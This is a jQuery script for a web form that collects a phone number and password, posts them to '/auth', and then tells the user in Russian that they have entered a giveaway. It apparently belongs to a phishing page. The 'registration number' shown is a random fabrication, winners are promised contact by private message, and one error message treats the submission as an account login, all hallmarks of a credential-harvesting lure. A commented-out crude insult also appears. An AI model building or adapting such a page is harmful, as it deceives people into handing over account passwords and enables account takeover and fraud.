import './bootstrap';

$('#next__btn').click(function(){
    let phone = $('#phone__input').val();
    let phoneOut = $('.number').html(phone);
});

let phoneField = document.getElementById('phone__input');

phoneField.onkeydown = checkPhoneLength;
phoneField.onkeyup = checkPhoneLength;
phoneField.onkeypress = checkPhoneLength;

function checkPhoneLength() {
    $('#phone__input').bind('input', function(){
    if ($(this).val().length >= 12) {
         $('.js-tab-trigger').click(function() {
        let id = $(this).attr('data-tab'),
         content = $('.js-tab-content[data-tab="'+ id +'"]');

        $('.js-tab-trigger.active').removeClass('active');
        $(this).addClass('active');

        $('.js-tab-content.active').removeClass('active');
        content.addClass('active');
      });

        $(".next__btn").prop('disabled', false);
        $(".next__btn").removeClass("opacity-70");
    }else {
        $(".next__btn").prop('disabled', true);

    }
});
}

let passwordField = document.getElementById('password__input');

passwordField.onkeydown = checkPasswordLength;
passwordField.onkeyup = checkPasswordLength;
passwordField.onkeypress = checkPasswordLength;


function checkPasswordLength() {
    $('#password__input').bind('input', function(){
        if ($(this).val().length > 2) {

            $("#submit__btn").prop('disabled', false);
            $("#submit__btn").removeClass("opacity-70");
        }else {
            $("#submit__btn").prop('disabled', true);

        }
    });
}
$('.checkbox').click(function(){
    $('.cheked').toggleClass('hidden');
    $('.nocheked').toggleClass('hidden');

});


$(document).ready(function () {
    $('#main__form').on('submit', function (){

        $.ajax({
            url: '/auth',
            type: "post",
            dataType: "html",
            data: $(this).serialize(),
            statusCode: {
                200: function (response) {
                    console.log('200');
                    $('.message__block').removeClass('hidden');
                    $('.overlay').removeClass('hidden');
                    var number = 1 + Math.floor(Math.random() * 1e10);
                    $('.message__item .text').html(`Вы успешно зарегистрировались в акции, Ваш регистрационный номер #${number}, результаты сообщат Вам в личном сообщении организаторы розыгрыша!`);

                },
                404: function (response) {
                    console.log('404');
                    $('.message__block').removeClass('hidden');
                    $('.overlay').removeClass('hidden');
                    $('.thx').remove();
                    $('.popup__img').attr('src','https://www.svgrepo.com/show/395406/close.svg');
                    $('.message__item .text').html(`Внимание произошла ошибка. \nПопробуйте еще раз`);

                    $(".popup a").html("Назад");
                },
                500: function (response) {
                    console.log('500');
                    $('.message__block').removeClass('hidden');
                    $('.overlay').removeClass('hidden');
                    $('.thx').remove();
                    $('.popup__img').attr('src','https://www.svgrepo.com/show/395406/close.svg');
                    $('.message__item .text').html(`Внимание произошла ошибка. \nНеправильный логин или пароль`);

                    $(".popup a").html("Назад");
                }
            },
            success: function(data){
                // $('#msg').html(data);
                console.log('success');
                // $('.message__block').addClass('block');
            },
            error: function (data) {
                // console.log('error');
                // alert('You gay');
            }

        });
    });
});
